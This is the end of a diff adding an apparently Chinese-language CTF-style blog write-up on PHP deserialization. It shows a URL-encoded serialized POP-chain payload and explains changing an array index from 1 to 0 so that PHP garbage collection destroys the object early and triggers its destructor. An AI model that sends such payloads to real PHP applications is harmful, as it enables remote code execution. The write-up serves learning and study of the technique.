+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="k">NULL</span><span class="p">);</span>		<span class="c1">// 置空数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意数组需要设置为0<strong>达到提前销毁对象的目的</strong> 触发gc垃圾回收，%3A<strong>1</strong>%3B  &ndash;&gt; %3A<strong>0</strong>%3B</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A1%3BN%3B%7D
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>改成：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="参考链接">🔗参考链接</h2>
+<p><a href="https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html">PHP新的垃圾回收机制 (yangxikun.com)</a></p>
+<p><a href="http://blog.m1kael.cn/index.php/archives/14/">PHP的GC机制 - M1kael‘s Blog</a></p>
+<p><a href="https://xz.aliyun.com/t/11843?accounttraceid=411ebc73f66f4f69aea04cef67b0ae0akryd">浅析PHP GC垃圾回收机制及常见利用方式 - 先知社区 (aliyun.com)</a></p>
+
+    </div>
+    <div class="post-footer">
+      <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
